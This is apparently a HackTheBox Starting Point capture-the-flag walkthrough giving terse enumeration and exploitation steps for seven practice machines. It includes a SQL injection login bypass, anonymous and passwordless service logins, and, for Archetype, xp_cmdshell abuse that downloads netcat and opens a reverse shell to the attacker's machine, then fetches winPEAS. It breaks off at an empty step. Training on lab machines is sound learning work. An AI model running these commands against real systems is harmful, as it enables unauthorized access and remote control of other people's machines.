# HackTheBox : Starting Point

## Meow

1. Enumeration:
    1. Nmap: `$ nmap -v -A -T4 <IP>`  --> telnet : 23/tcp
2. Exploitation:
    1. telnet: `$ telnet <IP>`  --> User : `root`
3. Flag:
    1. `$ cat flag.txt`

## Fawn

1. Enumeration:
    1.Nmap: `$ nmap -v -A -T4 <IP>`  --> ftp-anon : 21/tcp
2. Exploitation:
    1. ftp: `$ ftp <IP>`  --> user : Anonymous / password : <empty>
3. Flag:
    1. `ftp> get flag.txt` --> download file

## Dancing

1. Enumeration:
    1. Nmap: `$ nmap -v -A -T4 <IP>` --> smb : 445/tcp
2. Exploitation:
    1. smbclient: `$ smbclient -L <IP>` --> list the available shares
    2. smbclient: `$ smbclient -N \\\\<IP>\\<share>` --> connect to share -N = no auth
3. Flag:
    1. `smb: \> get flag.txt` --> download file

## Appointment

1. Enumeration:
    1. Nmap: `$ nmap -v -A -T4 <IP>` --> Apache/2.4.38 (Debian) : 80/tcp
2. Exploitation:
    1. SQLi: username = `admin` & password = `' OR 1=1 #`
3. Flag:
    1. Displayed onscreen.

## Sequel

1. Enumeration:
    1. Nmap: `$ nmap -v -A -T4 <IP>` --> mysql : 3306/tcp
2. Exploitation:
    1. mysql: `$ mysql -h <IP> -u root`
    2. mysql: `MariaDB [(none)]> SHOW databases;`
    3. mysql: `MariaDB [(none)]> USE htb;`
    4. mysql: `MariaDB [(htb)]> SHOW tables;`
    5. mysql: `MariaDB [(htb)]> SELECT * FROM config;`
3. Flag:
    1. Read from table.

## Crocodile

1. Enumeration:
    1. Nmap: `$ nmap -v -A -T4 <IP>` --> ftp-anon : 21/tcp && Apache/2.4.41 (Ubuntu) : 80/tcp
2. Exploitation:
    1. ftp: `$ ftp <IP>`  --> user : Anonymous / password : <empty>
    2. ftp: `ftp> dir` --> list all files available
    3. ftp: `ftp> get allowed.userlist` --> download file
    4. ftp: `ftp> get allowed.userlist.passwd` --> download file
    5. dirsearch: `$ dirsearch -u http://<IP>/` --> found `/login.php` page
    6. Use creds found in both files
3. Flag:
    1. Displayed onscreen.

## Archetype

1. Enumeration:
    1. Nmap: `$ nmap -v -A -T4 <IP>` --> smb : 445/tcp && mssql : 1433/tcp
2. Exploitation:
    1. smbclient: `$ smbclient -L <IP>` --> list the available shares
    2. smbclient: `$ smbclient -N \\\\<IP>\\<share>` --> connect to share -N = no auth
    3. smbclient: `smb: \> get prod.dtsConfig` --> credentials found in file
    4. impacket-mssqlclient: `$ impacket-mssqlclient ARCHETYPE/sql_svc:<password>@<IP> -windows-auth` --> connect to mssql
    5. MSSQL: `SQL> enable_xp_cmdshell;` --> enable xp_cmdshell to run commands
    6. MSSQL: `SQL> RECONFIGURE;`
    7. MSSQL: `SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget <link to netcat executable> -outfile nc64.exe` --> download netcat in folder where we have enough privileges (downloads)
    8. netcat: `nc -nvlp 4444` --> netcat listening on our machine
    9. MSSQL: `SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <MyIP> 4444` --> target machine is connecting to our listening netcat, and will run through cmd.exe everythin our netcat sends, to send it back to us
    10. netcat->cmd: `C:\Users\sql_svc\Downloads>powershell` --> listening netcat is now a powershell shell
    11. netcat->powershell: `PS> wget <link to winpeas executable> -outfile winPEASx64.exe` --> download winPEAS on target machine
    12. 